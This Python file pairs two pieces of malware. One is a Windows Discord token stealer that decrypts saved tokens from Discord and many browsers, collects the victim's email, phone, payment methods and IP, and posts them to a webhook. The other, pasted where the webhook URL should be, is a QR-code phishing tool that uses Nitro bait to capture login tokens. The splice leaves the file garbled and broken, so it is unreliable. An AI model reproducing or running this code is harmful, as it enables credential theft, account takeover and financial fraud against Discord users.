import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token))).read().decode())
                friends = len([x for x in res if x['type'] == 1])

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/astraadev"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                }

                urllib.request.urlopen(urllib.request.Request('"""
Discord QR Token Logger
-----------------------
Generates a Discord Nitro bait image with a QR code that will prompt a user to login.
If the user logs in, their authentication token will be displayed to the console.
Optionally, the user's authentication token may also be sent to a Discord channel via a webhook.
LICENSE
The actual repository is unlicensed, it mean all rights are reserved. You cannot modify or redistribute this code without explicit permission from the copyright holders.
Violating this rule may lead our intervention according to the Github Terms of Service — User-Generated Content — Section D.3 using the Content Removal Policies — DMCA Takedown Policy.
CREDITS
Lemon.-_-.#3714
the-cult-of-integral
"""

import base64
import ctypes
import os
import time
import win32clipboard
import requests
from io import BytesIO
from tempfile import NamedTemporaryFile, TemporaryDirectory
from threading import Thread, Event
from PIL import Image
from pystray import Icon, Menu, MenuItem
from pystyle import Box, Center, Colorate, Colors, System, Write
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from constants import BANNER, PYSTRAY_IMG
from discord_token import QRGrabber, TokenInfo
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
from queue import Queue
import signal
import atexit
from cairosvg import svg2png


def main(webhook_url: str) -> None:
    proxy_value = Write.Input(
        "\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    )
    opts = webdriver.ChromeOptions()
    opts.add_argument("--headless")
    opts.add_argument("--silent")
    opts.add_argument("start-maximized")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("disable-infobars")
    opts.add_argument("--disable-browser-side-navigation")
    opts.add_argument("--disable-default-apps")
    opts.add_experimental_option("detach", True)
    opts.add_experimental_option("excludeSwitches", ["enable-logging"])
    opts.add_extension(
        os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "resources",
            "extension_0_3_12_0.crx",
        )
    )
    if proxy_value:
        proxies_http = {
            "http": f"http://{proxy_value}",
            "https": f"http://{proxy_value}",
        }
        proxies_https = {
            "http": f"https://{proxy_value}",
            "https": f"https://{proxy_value}",
        }
        try:
            ip_info = requests.get(
                "http://ip-api.com/json", proxies=proxies_http
            ).json()
        except requests.exceptions.RequestException:
            try:
                ip_info = requests.get(
                    "http://ip-api.com/json", proxies=proxies_https
                ).json()
            except requests.exceptions.RequestException as e:
                raise SystemExit(
                    Write.Print(
                        f"\n[^] Critical error when using the proxy server !\n\nThe script returning :\n\n{e}",
                        Colors.yellow_to_green,
                    )
                )
        if ip_info["query"] == proxy_value.split(":")[0]:
            Write.Print(
                f"\n[!] Proxy server detected in {ip_info['country']}, establishing connection...",
                Colors.red_to_purple,
            )
            opts.add_argument(f"--proxy-server={proxy_value}")
        else:
            raise SystemExit(
                Write.Print(
                    f"\n[^] Proxy server not working, or being detected by Discord.",
                    Colors.yellow_to_green,
                )
            )
    Write.Print("\n\n[!] Generating QR code...", Colors.red_to_purple)
    # This module have conflicts with PyStyle; importing here prevents the issue.
    try:
        main.driver = webdriver.Chrome(options=opts)
    except:
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.service import Service

        os.environ["WDM_PROGRESS_BAR"] = str(0)
        os.environ["WDM_LOG_LEVEL"] = "0"
        try:
            main.driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()), options=opts
            )
        except WebDriverException as e:
            raise SystemExit(
                Write.Print(
                    f"\n\n[!] WebDriverException occured ! The script returned :\n\n{e}",
                    Colors.yellow_to_green,
                )
            )
    main.driver.implicitly_wait(5)
    main.driver.get("https://discord.com/login")
    time.sleep(5)
    qrg = QRGrabber(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "resources")
    )
    try:
        qr_code = qrg.get_qr_from_source(main.driver)
    except QRCodeNotFound as e:
        try:
            main.driver.quit()
        except:
            pass
        raise SystemExit(
            Write.Print(
                f"\n\n[^] QrCodeException occured ! The script returned :\n\n{e}",
                Colors.yellow_to_green,
            )
        )
    discord_login = main.driver.current_url
    with TemporaryDirectory(dir=".") as td:
        with NamedTemporaryFile(dir=td, suffix=".png") as tp1:
            tp1.write(svg2png(qr_code))
            Write.Print(
                "\n[!] Generating template for QR code...", Colors.red_to_purple
            )
            with NamedTemporaryFile(dir=td, suffix=".png") as tp2:
                qrg.generate_qr_for_template(tp1, tp2)
                Write.Print(
                    "\n[!] Generating Discord Nitro template for QR code...",
                    Colors.red_to_purple,
                )
                qrg.generate_nitro_template(tp2)
    output = BytesIO()
    Image.open("discord_gift.png").convert("RGB").save(output, "BMP")
    data = output.getvalue()[14:]
    output.close()
    win32clipboard.OpenClipboard(), win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_DIB, data)
    win32clipboard.CloseClipboard()
    Write.Print(
        "\n[#] The Qr-Code is copied to clipboard, waiting for target to login using the QR code...",
        Colors.red_to_purple,
    )
    pystray_icon.icon.notify(
        "This script has been set to hide until the target's token is grabbed.",
        "Waiting for target",
    )
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def timer_killer(q, e):
        while True:
            if e.is_set() != True:
                if discord_login != main.driver.current_url:
                    try:
                        os.remove("discord_gift.png")
                    except BaseException:
                        pass
                    token = main.driver.execute_script(
                        """
                        window.dispatchEvent(new Event('beforeunload'));
                        let iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        let localStorage = iframe.contentWindow.localStorage;
                        var token = JSON.parse(localStorage.token);
                        return token;
                        """
                    )
                    q.put(token)
                    break
            else:
                break
        main.driver.quit()

    q, e = Queue(), Event()
    thread_timer_killer = Thread(
        target=timer_killer,
        args=(
            q,
            e,
        ),
    )
    thread_timer_killer.start()
    thread_timer_killer.join(120)
    if thread_timer_killer.is_alive():
        e.set()
        while thread_timer_killer.is_alive():
            continue
        main.driver.quit()
        try:
            os.remove("discord_gift.png")
        except BaseException:
            pass
        pystray_icon.icon.notify("The Qr-Code has expired !", "Exiting...")
        time.sleep(3)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
        raise SystemExit(
            Write.Print(
                "\n\n[^] The Qr-Code have expired, exiting...", Colors.yellow_to_green
            )
        )
    pystray_icon.icon.notify(
        "The target scanned the QR-code sucessfuly.", "New Victim !"
    )
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
    try:
        token_info = TokenInfo(q.get())
        Write.Print(
            f"\n\n[?] The following token has been grabbed: {token_info.token}",
            Colors.rainbow,
        )
        if webhook_url is not None:
            try:
                token_info.send_info_to_webhook(webhook_url)
            except WebhookSendFailure as e:
                Write.Print(f"[!] {e}", Colors.red)
        Write.Input("\n\n[*] Press ENTER to quit.", Colors.blue_to_green)
    except InvalidToken:
        Write.Print(
            "\n\n[!] An invalid token has been accessed.", Colors.yellow_to_green
        )


if __name__ == "__main__":

    def handle_exit():
        try:
            main.driver.quit()
        except:
            pass
        try:
            pystray_icon.icon.stop()
        except:
            pass

    atexit.register(handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)
    signal.signal(signal.SIGINT, handle_exit)

    def pystray_icon():
        def window_state(_, item):
            if str(item) == "Show":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 5
                )
            elif str(item) == "Hide":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            elif str(item) == "Quit":
                pystray_icon.icon.stop()
                try:
                    main.driver.quit()
                except:
                    pass
                    pass
                os._exit(0)

        pystray_icon.icon = Icon(
            "QR_DTG",
            Image.open(BytesIO(base64.b64decode(PYSTRAY_IMG))),
            menu=Menu(
                MenuItem("Show", window_state),
                MenuItem("Hide", window_state),
                MenuItem("Quit", window_state),
            ),
        )
        pystray_icon.icon.run()

    System.Title("QR DISCORD LOGIN - By Lemon.-_-.#3714 (mouadessalim)")
    System.Size(140, 35)
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714 (mouadessalim)")),
            1,
        )
    )
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace(
                "ቐ", "$"
            ),
            1,
        ),
        "\n",
    )
    confir = Write.Input(
        "[*] Do you want to use a Discord Webhook URL ? [y/n] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    ).lower()
    if confir == "yes" or confir == "y":
        th_main = Thread(
            target=main,
            args=(
                Write.Input(
                    "\n[*] Enter your webhook url -> ",
                    Colors.green_to_cyan,
                    interval=0.01,
                ),
            ),
        )
    elif confir == "no" or confir == "n":
        th_main = Thread(target=main, args=(None,))
    else:
        raise SystemExit(
            Write.Print(
                "[!] Failed to recognise an input of either 'y' or 'n'.",
                Colors.yellow_to_green,
            )
        )
    Thread(target=pystray_icon).start()
    th_main.start()
    while th_main.is_alive():
        time.sleep(1)
    pystray_icon.icon.stop()', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

if __name__ == "__main__":
    main()
